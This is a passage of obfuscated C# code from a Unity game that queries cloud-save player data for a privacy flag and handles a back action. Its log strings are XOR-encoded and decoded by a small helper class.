                _0x6031ceeb = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x1ef3e38c._0xdf7d4e91(new byte[8] { 92, 64, 77, 85, 73, 94, 101, 72 }, 44), _0x38800619, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x1ef3e38c._0xdf7d4e91(new byte[9] { 65, 91, 120, 90, 65, 94, 73, 75, 81 }, 40) }), new QueryOptions())).ToList();
            }
            catch (Exception e)
            {
                {
#if B_LOGS
                    {
                        Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[32] { 45, 34, 19, 5, 2, 43, 86, 7, 3, 19, 4, 15, 55, 5, 15, 24, 21, 36, 19, 5, 3, 26, 2, 5, 86, 19, 4, 4, 25, 4, 76, 86 }, 118) + e.Message);
                    }
#endif
                }
            }

            await Task.Delay(_0xa8815b19);
        }
        while (_0x6031ceeb.Count == 0 && _0x09eaf443++ < _0x9c9287c8);
        {
#if B_LOGS
            {
                Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[32] { 45, 34, 19, 5, 2, 43, 86, 63, 5, 38, 4, 31, 0, 23, 21, 15, 86, 39, 3, 19, 4, 15, 86, 4, 19, 5, 3, 26, 2, 5, 76, 86 }, 118) + JsonConvert.SerializeObject(_0x6031ceeb, Formatting.Indented));
            }
#endif
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[38] { 125, 114, 67, 85, 82, 123, 6, 111, 85, 118, 84, 79, 80, 71, 69, 95, 6, 119, 83, 67, 84, 95, 6, 84, 67, 85, 83, 74, 82, 85, 6, 69, 73, 83, 72, 82, 28, 6 }, 38) + _0x6031ceeb.Count);
            }
#endif
        }

        bool _0x75bc53ca = true;
        if (_0x6031ceeb.Count == 0)
        {
            _0x75bc53ca = false;
        }
        else
        {
            _0x75bc53ca = _0x6031ceeb.Any(_0xda2b59ce => _0xda2b59ce.Data.Any(IsPrivacyItemTrue));
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x1ef3e38c._0xdf7d4e91(new byte[25] { 76, 67, 114, 100, 99, 74, 55, 94, 100, 71, 101, 126, 97, 118, 116, 110, 55, 101, 114, 100, 98, 123, 99, 45, 55 }, 23) + _0x75bc53ca);
            }
#endif
        }

        return _0x75bc53ca;
    }

    internal bool isApplicationPause = false;
    private string _0x011ac354 = "";
    private string _0x7ea879f2 = "";
    private bool _0x03262b38()
    {
        var _0x26cda84b = _0xd03ae801();
        if (_0x26cda84b == null)
            return false;
        WLog(_0x1ef3e38c._0xdf7d4e91(new byte[31] { 208, 249, 234, 252, 239, 249, 234, 253, 184, 250, 249, 251, 243, 184, 181, 166, 184, 232, 247, 232, 237, 232, 184, 223, 247, 218, 249, 251, 243, 162, 184 }, 152) + _0x26cda84b.Id);
        _0x26cda84b.GoBack();
        return true;
    }

    private bool _0x8c5e6ae3 = false;
}

internal static class _0x1ef3e38c
{
    internal static string _0xdf7d4e91(byte[] data, byte key)
    {
        var buffer = new byte[data.Length];
        for (var i = 0; i < data.Length; i++)
            buffer[i] = (byte)(data[i] ^ key);
        return System.Text.Encoding.UTF8.GetString(buffer);
    }
}